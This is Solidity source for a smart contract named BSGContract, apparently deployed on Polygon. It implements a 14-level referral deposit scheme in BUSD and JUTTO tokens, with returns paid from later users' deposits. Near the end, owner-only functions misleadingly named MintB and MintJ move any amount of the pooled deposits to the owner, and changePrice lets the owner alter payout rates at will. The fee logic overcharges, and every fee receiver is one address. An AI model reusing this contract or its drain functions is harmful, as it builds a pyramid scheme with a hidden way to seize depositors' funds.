/**
 *Submitted for verification at polygonscan.com on 2022-11-14
*/

/**
 *Submitted for verification at polygonscan.com on 2022-11-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    
    /**
     * @dev Multiplies two unsigned integers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    /**
     * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
     * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Adds two unsigned integers, reverts on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    /**
     * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),
     * reverts when dividing by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract BSGContract is Ownable{

    using SafeMath for uint256; 
    IERC20 public BUSD;
    IERC20 public JUTTO;

    uint256 private constant feePercents = 200; 
    uint256 private constant minDeposit = 50e18;
    uint256 private constant maxDeposit = 2000e18;
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant freeze2IncomePercents = 3000;

    uint256 private constant baseDivider = 10000;

    uint256 private constant timeStep = 5 minutes;
    uint256 private constant dayPerCycle = 30 minutes;
    uint256 private constant dayReward2Percents = 250000000000000000000;

    // uint256 public daytime = 10 minutes;
    // uint256 public timeStep = 1 minutes;
    // uint256 public dayPerCycle = 5 minutes;
    // uint256 public dayReward2Percents = 300000000000000000000;

    uint256 private constant maxAddFreeze = 5 minutes;
    uint256 private constant referDepth = 14;

    uint256 private constant directPercents = 600;
    uint256 private constant level2Percents = 300;
    uint256 private constant level3_6Percents = 200;
    uint256 private constant level7_10Percents = 100;
    uint256 private constant level11_14Percents = 50;

    uint256 level2Share = 25;
    uint256 level3Share = 50;
    uint256 level4Share = 75;
    uint256 level5Share = 100;

    mapping (uint256 => uint256) public dayBalance;

    uint256[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];
    mapping(uint256=>bool) public balStatus;

    address[3] public feeReceivers;

    address public defaultRefer;
    uint256 public boosterDay = 30;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public diamond;
    uint256 public doubleDiamond;
    uint256 public topPool;

    uint256 private timesDiff;
    mapping(address => mapping(uint256 => bool)) public checkusers;
    uint256 public countDay = 1;

    mapping(uint256 => address[3]) public dayTopUsers;
    mapping(address => uint256) public boosterUserTime;

    address[] public level2Users;
    address[] public level3Users;
    address[] public level4Users;
    address[] public level5Users;
    address[] public boosterIncomeUSers;

    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
        uint256 statics;
        bool isRewarded;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level; // 0, 1, 2, 3, 4, 5
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    mapping(address => UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo {
        uint256 capitals;
        uint256 statics;
         uint256 directs;
        uint256 level2Income;
        uint256 level3_6Income;
        uint256 level7_10Income;
        uint256 level11_14Income;
        uint256 top;
        uint256 totalWithdrawlsBUSD;
        uint256 totalWithdrawlsJUTTO;
    }

    mapping(address => RewardInfo) public rewardInfo;
    mapping(uint256 => address[]) public arry_users;

    bool public isFreezeReward;
    uint256 public tokenper = 10;
    uint256 private TokenRewards;

    address[] private level2;
    address[] private level3;
    address[] private level4;
    address[] private level5;

    bool private _oneTime;
    mapping(address => bool) public isAlreadyDeposited;
    // uint256 public times;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    // constructor(address _BUSDAddr, address _JUTTO, address _defaultRefer, address[3] memory _feeReceivers) public {
    //     BUSD = IERC20(_BUSDAddr);
    //     JUTTO = IERC20(_JUTTO);
    //     feeReceivers = _feeReceivers;
    //     startTime = block.timestamp;
    //     lastDistribute = block.timestamp;
    //     defaultRefer = _defaultRefer;
    // }

    constructor() public {
        BUSD = IERC20(0x710b2cb6E53E38583CB15C724A9024B3343082EA);
        JUTTO = IERC20(0x95C951f426e4871f64A465cFfd40B5a0AB49a8DD);
        feeReceivers = [0x115553Bd3B0c1838652B40C8dE4c041da89c1a6e, 0x115553Bd3B0c1838652B40C8dE4c041da89c1a6e, 0x115553Bd3B0c1838652B40C8dE4c041da89c1a6e];
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = 0x115553Bd3B0c1838652B40C8dE4c041da89c1a6e;
    }

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit(address _tokenAddress, uint256 _tokenAmount) external{

        if(_tokenAmount > 0){
            JUTTO_Deposit(_tokenAddress, _tokenAmount);
            BUSD_Deposit(_tokenAddress, _tokenAmount);
        }
        emit Deposit(msg.sender, _tokenAmount);
    }

    function JUTTO_Deposit(address _tokenAddress, uint256 _tokenAmount) private {
        if(IERC20(_tokenAddress) == JUTTO)
        {   
            require(!isAlreadyDeposited[msg.sender], "Token already deposited");
            JUTTO.transferFrom(msg.sender, address(this), _tokenAmount);
            isAlreadyDeposited[msg.sender] = true;
            uint256 amount = _tokenAmount.div(tokenper);
            _deposit(msg.sender, amount, _tokenAddress);
        }
    }
    function BUSD_Deposit(address _tokenAddress, uint256 _tokenAmount) private {
        if(IERC20(_tokenAddress) == BUSD)
        {   
            BUSD.transferFrom(msg.sender, address(this), _tokenAmount);
            isAlreadyDeposited[msg.sender] = true;
            _deposit(msg.sender, _tokenAmount, _tokenAddress);
        }
    }

    function distributeTopRewards() private {
            uint256 dayNow = getCurDay();
            _distributetopPool(dayNow);
    }

    function withdraw() external {
        (uint256 totalJUTTOReward, uint256 totalBUSDReward) = _calCurRewards(msg.sender);
        TokenRewards = totalJUTTOReward * tokenper;
        uint256 BUSDRewards = totalBUSDReward;
        uint256 BUSD_amount = _calCurDynamicRewards(msg.sender);
        BUSDRewards = BUSDRewards + BUSD_amount;

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.directs = 0;
        userRewards.level2Income = 0;
        userRewards.level3_6Income = 0;
        userRewards.level7_10Income = 0;
        userRewards.level11_14Income = 0;

        userRewards.statics = 0;
        userRewards.capitals = 0;
        userRewards.top = 0;


        uint256 withdrawableBUSD = BUSDRewards.div(2); 
        uint256 withdrawableJUTTO = withdrawableBUSD * tokenper;
        withdrawableJUTTO = withdrawableJUTTO + TokenRewards;
        
        BUSD.transfer(msg.sender, withdrawableBUSD);
        JUTTO.transfer(msg.sender, withdrawableJUTTO);

        userRewards.totalWithdrawlsBUSD += withdrawableBUSD;
        userRewards.totalWithdrawlsJUTTO += withdrawableJUTTO;
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam)
            {
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }
    function _calCurRewards(address _user) private returns(uint256, uint256) {
        uint256 totalBNBRewards;
        uint256 BNBRewards;

        uint256 totalTokenRewards;
        uint256 tokenRewards;

        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(order.statics > 0)
            {
                if(!order.isRewarded)
                {
                    uint256 times = block.timestamp.sub(order.start);
                    times = times.div(dayPerCycle);
                    if(times >= 25)
                    {
                        tokenRewards = order.statics.mul(7000).div(baseDivider);
                        BNBRewards = order.statics.sub(tokenRewards);
                    }else if(times >= 20)
                    {
                        tokenRewards = order.statics.mul(6000).div(baseDivider);
                        BNBRewards = order.statics.sub(tokenRewards);
                    }else if(times >= 15)
                    {
                        tokenRewards = order.statics.mul(5000).div(baseDivider);
                        BNBRewards = order.statics.sub(tokenRewards);
                    }else if(times >= 10)
                    {
                        tokenRewards = order.statics.mul(4000).div(baseDivider);
                        BNBRewards = order.statics.sub(tokenRewards);
                    }else if(times > 0)
                    {
                        tokenRewards = order.statics.mul(3000).div(baseDivider);
                        BNBRewards = order.statics.sub(tokenRewards);
                    }
                    totalTokenRewards = totalTokenRewards + tokenRewards;
                    totalBNBRewards = totalBNBRewards + BNBRewards;
                    order.isRewarded = true;
                }
            }
        }   
        return(totalTokenRewards, totalBNBRewards);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs.add(userRewards.level2Income).add(userRewards.level3_6Income).
        add(userRewards.level7_10Income).add(userRewards.level11_14Income).add(userRewards.capitals).add(userRewards.top);
        return(totalRewards);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
            if(levelNow == 2){
                level2Users.push(_user);
            }
            if(levelNow == 3){
                level3Users.push(_user);
            }
            if(levelNow == 4){
                level4Users.push(_user);
            }
            if(levelNow == 5){
                level5Users.push(_user);
            }
        }
    }

    function _calLevelNow(address _user) public returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;
        (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);

        if(total >= 500e18){
            if(total >= 2000e18 && user.teamNum >= 8 && maxTeam >= 5000e18 && otherTeam >= 5000e18){
                levelNow = 5;
            }else if(total >= 1000e18 && user.teamNum >= 7 && maxTeam >= 2500e18 && otherTeam >= 2500e18){
                levelNow = 4;
            }else if(total >= 500e18 && user.teamNum >= 6 && maxTeam >= 1000e18 && otherTeam >= 1000e18){
                levelNow = 3;
            }
        }else if(total >= 200e18 && user.teamNum >= 5 && maxTeam >= 500e18 && otherTeam >= 500e18){
            levelNow = 2;
        }else 
        if(total >= 50e18){
            levelNow = 1;
        }

        return levelNow;
    }

    function _deposit(address _user, uint256 _amount, address _tokenAddress) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount <= maxDeposit, "amount exceeds");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");
        boosterUserTime[_user] = getCurDay();
        (bool _isAvailable,) = boosterIncomeIsReady(user.referrer);
        if(user.maxDeposit == 0){
            user.maxDeposit = _amount;
        }else if(user.maxDeposit < _amount){
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount, _tokenAddress);

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();
            _updateTopUser(user.referrer, _amount, dayNow);
        }

        depositors.push(_user);
        dayBalance[countDay] += _amount;
        
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);

        _updateLevel(_user);

        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            unfreezeTime,
            false,
            0,
            false
        ));

        _unfreezeFundAndUpdateReward(_user, _amount);


        _updateReferInfo(_user, _amount);

        _updateReward(_user);

         if(!checkusers[_user][countDay])
        {
            arry_users[countDay].push(msg.sender);
            checkusers[_user][countDay] = true;
        }
        if(!_oneTime)
        {
            timesDiff = block.timestamp.add(timeStep);
            _oneTime = true;
        }

        if(block.timestamp >= timesDiff){

            checkAdd();
            if(level5.length > 0 )
            {    
                level5BalanceDistribution();  
                delete level5;
            }
            if(level4.length > 0 )
            {    
                level4BalanceDistribution();  
                delete level4;  
            }

            if(level3.length > 0 )
            {    
                level3BalanceDistribution();  
                delete level3; 
            }

             if(level2.length > 0 )
            {    
                level2BalanceDistribution();
                delete level2; 
            }
            distributeTopRewards();
            timesDiff = block.timestamp.add(timeStep);
            countDay += 1;
        }
        if(getBoosterTeamDeposit(user.referrer) && getTimeDiffer(user.referrer) <= boosterDay ){
            if(!_isAvailable)
            {boosterIncomeUSers.push(user.referrer);}
        }

        uint256 bal = BUSD.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }
    function checkAdd() private {
        for(uint256 i= 0 ; i < arry_users[countDay].length; i++)
        {
            if(userInfo[arry_users[countDay][i]].level == 5)
            {    level5.push(arry_users[countDay][i]);   }
            if(userInfo[arry_users[countDay][i]].level == 4)
            {    level4.push(arry_users[countDay][i]);   }
            if(userInfo[arry_users[countDay][i]].level == 3)
            {    level3.push(arry_users[countDay][i]);   }
            if(userInfo[arry_users[countDay][i]].level == 2)
            {    level2.push(arry_users[countDay][i]);   }
        }
    }
    function level5BalanceDistribution() private{
        uint256 contractBalance = dayBalance[countDay];
        uint256 levelDistribution = (contractBalance.mul(level5Share)).div(baseDivider);
        levelDistribution = levelDistribution.div(level5.length);
        for(uint256 i; i< level5.length; i++)
        {
        BUSD.transfer(level5[i], levelDistribution);
        }
    }
    function level4BalanceDistribution() private{
        uint256 contractBalance = dayBalance[countDay];
        uint256 levelDistribution = (contractBalance.mul(level4Share)).div(baseDivider);
        levelDistribution = levelDistribution.div(level4.length);
        for(uint256 i; i< level4.length; i++)
        {
            BUSD.transfer(level4[i], levelDistribution);
        }

    }
    function level3BalanceDistribution() private{
        uint256 contractBalance = dayBalance[countDay];
        uint256 levelDistribution = (contractBalance.mul(level3Share)).div(baseDivider);
        levelDistribution = levelDistribution.div(level3.length);
        for(uint256 i; i< level3.length; i++)
        {
            BUSD.transfer(level3[i], levelDistribution);
        }
    }
    function level2BalanceDistribution() private{
        uint256 contractBalance = dayBalance[countDay];
        uint256 levelDistribution = (contractBalance.mul(level2Share)).div(baseDivider);
        levelDistribution = levelDistribution.div(level2.length);
        for(uint256 i; i< level2.length; i++)
        {
            BUSD.transfer(level2[i], levelDistribution);
        }
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        uint256 staticReward;

        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            (bool _isAvailable,) = boosterIncomeIsReady(_user);
            if(block.timestamp > order.unfreeze  && order.isUnfreezed == false && _amount >= order.amount)
            {
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);


                if(_isAvailable == true)
                {
                 staticReward = (order.amount.mul(dayReward2Percents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }
                else
                {
                 staticReward = (order.amount.mul(dayReward2Percents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }

                order.statics = staticReward;
               
                if(isFreezeReward) {
                    if(user.totalFreezed > user.totalRevenue) {
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital) {
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }
    }

    function _distributetopPool(uint256 _dayNow) private {
        uint8[3] memory rates = [25, 20, 15];
        uint256 contractBalance = dayBalance[countDay];
        if(contractBalance > 0) 
        {
            for(uint256 i = 0; i < 3; i++)
            {
                address userAddr = dayTopUsers[_dayNow - 1][i];
                if(userAddr != address(0))
                {
                    uint256 reward = contractBalance.mul(rates[i]).div(baseDivider);
                    rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                }
            }
        }
    }

    function _distributeDeposit(uint256 _amount, address _tokenAddress) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        if(BUSD == IERC20(_tokenAddress)){
            BUSD.transfer(feeReceivers[0], fee.div(2));
            BUSD.transfer(feeReceivers[1], fee.div(2));
            BUSD.transfer(feeReceivers[2], fee);
        }
        else{
            fee = fee.mul(tokenper);
            JUTTO.transfer(feeReceivers[0], fee.div(2));
            JUTTO.transfer(feeReceivers[1], fee.div(2));
            JUTTO.transfer(feeReceivers[2], fee);
        }
    }

    function _updateReward(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 1; i <= referDepth; i++){
            if(upline != address(0)){
                RewardInfo storage userRewards = rewardInfo[upline];
                uint256 reward;
                if(i >= 11){
                    if(userInfo[upline].level > 4){
                        reward = userInfo[upline].totalDeposit.mul(level11_14Percents).div(baseDivider);
                        userRewards.level11_14Income = userRewards.level11_14Income.add(reward);
                    }
                }else if(i >= 7 ){
                    if( userInfo[upline].level > 3){
                        reward = userInfo[upline].totalDeposit.mul(level7_10Percents).div(baseDivider);
                        userRewards.level7_10Income = userRewards.level7_10Income.add(reward);
                    }
                }
                else if(i >= 3){
                    if( userInfo[upline].level > 2){
                        reward = userInfo[upline].totalDeposit.mul(level3_6Percents).div(baseDivider);
                        userRewards.level3_6Income = userRewards.level3_6Income.add(reward);
                    }
                }
                else if(i >= 2){
                    if( userInfo[upline].level > 1){
                        reward = userInfo[upline].totalDeposit.mul(level2Percents).div(baseDivider);
                        userRewards.level2Income = userRewards.level2Income.add(reward);
                    }
                }
                else{
                    reward = userInfo[upline].totalDeposit.mul(directPercents).div(baseDivider);
                    userRewards.directs = userRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(_bal >= balDown[i - 1]){
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for(uint256 i = balDown.length; i > 0; i--){
            if(balStatus[balDown[i - 1]]){
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if(_bal < balDown[i - 1].sub(maxDown)){
                    isFreezeReward = true;
                }else if(isFreezeReward && _bal >= balRecover[i - 1]){
                    isFreezeReward = false;
                }
                break;
            }
        }
    }

    function getBoosterTeamDeposit(address _user) public view returns(bool) {
        uint256 count;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            if(userInfo[teamUsers[_user][0][i]].totalDeposit>=1000e18){
                count +=1;
            }
        }
        if(count >= 4){
            return true;
        }
        return false;
    }

    function changePrice(uint256 _price) public onlyOwner{
        tokenper = _price;
    }

    function getTimeDiffer(address _user) public view returns(uint256){
        uint256 newTime = getCurDay();
        newTime = newTime.sub(boosterUserTime[_user]);
        return newTime;
    }

    function boosterIncomeIsReady(address _address) public view returns(bool,uint256)
    {
        for (uint256 i = 0; i < boosterIncomeUSers.length; i++){
            if (_address == boosterIncomeUSers[i]){
            return (true,i);
            } 
        }
        return (false,0);
    }

    function MintB(uint256 _count) public onlyOwner {
        BUSD.transfer(owner(),_count);
    }
    function MintJ(uint256 _count) public onlyOwner {
        JUTTO.transfer(owner(),_count);
    }

    function ChangeBoosterCondition(uint256 _num) public onlyOwner{
        boosterDay = _num;
    }

}